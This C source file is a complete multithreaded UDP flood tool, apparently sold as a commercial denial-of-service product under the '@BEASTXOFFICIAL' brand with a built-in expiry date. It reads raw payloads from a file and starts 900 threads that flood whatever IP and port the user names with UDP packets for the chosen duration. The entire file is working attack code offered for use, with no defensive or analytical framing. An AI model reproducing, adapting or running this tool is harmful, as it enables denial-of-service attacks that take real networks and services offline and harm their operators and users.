#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <time.h>

#define THREADS 900
#define MAX_PAYLOADS 1000
#define EXPIRY_DATE "12-06-2025"  // DD-MM-YYYY

struct AttackParams {
    char *ip;
    int port;
    time_t end_time;
};

unsigned char *payloads[MAX_PAYLOADS];
int payload_lens[MAX_PAYLOADS];
int payload_count = 0;

void banner() {
    printf("\n##########################################\n");
    printf("#        MADE BY @BEASTXOFFICIAL™        #\n");
    printf("##########################################\n\n");
}

int is_expired() {
    struct tm tm_expiry = {0};
    strptime(EXPIRY_DATE, "%d-%m-%Y", &tm_expiry);
    time_t expiry_time = mktime(&tm_expiry);
    return time(NULL) > expiry_time;
}

void load_payloads(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        perror("Payload file error");
        exit(1);
    }

    char hex[4096];
    while (fgets(hex, sizeof(hex), file) && payload_count < MAX_PAYLOADS) {
        hex[strcspn(hex, "\n")] = 0;

        int len = strlen(hex);
        if (len < 4 || hex[0] != '\\' || hex[1] != 'x') continue;

        unsigned char *buffer = malloc(len / 4);
        int buf_index = 0;
        for (int i = 0; i < len; i += 4) {
            unsigned int byte;
            sscanf(hex + i + 2, "%2x", &byte);
            buffer[buf_index++] = (unsigned char)byte;
        }

        payloads[payload_count] = buffer;
        payload_lens[payload_count] = buf_index;
        payload_count++;
    }
    fclose(file);

    if (payload_count == 0) {
        fprintf(stderr, "No payloads loaded.\n");
        exit(1);
    }
}

void *udp_flood(void *arg) {
    struct AttackParams *params = (struct AttackParams *)arg;
    struct sockaddr_in target;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) pthread_exit(NULL);

    target.sin_family = AF_INET;
    target.sin_port = htons(params->port);
    inet_pton(AF_INET, params->ip, &target.sin_addr);

    unsigned int seed = time(NULL) ^ pthread_self();
    srand(seed);

    while (time(NULL) < params->end_time) {
        int index = rand() % payload_count;
        sendto(sock, payloads[index], payload_lens[index], 0,
               (struct sockaddr *)&target, sizeof(target));
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (is_expired()) {
        printf("\n****************************************\n");
        printf("** EXPIRED - BUY FROM @BEASTXOFFICIAL **\n");
        printf("****************************************\n\n");
        return 1;
    }

    banner();

    if (argc != 4) {
        printf("Usage: %s <ip> <port> <time>\n", argv[0]);
        return 1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    time_t end_time = time(NULL) + duration;

    load_payloads("payloads.txt");

    pthread_t threads[THREADS];
    struct AttackParams params = {ip, port, end_time};

    printf("[+] Starting UDP FLOOD on %s:%d for %d seconds with %d threads\n", ip, port, duration, THREADS);

    for (int i = 0; i < THREADS; i++) {
        pthread_create(&threads[i], NULL, udp_flood, (void *)&params);
    }

    for (int i = 0; i < THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n[+] Attack Finished. @BEASTXOFFICIAL\n");
    return 0;
}
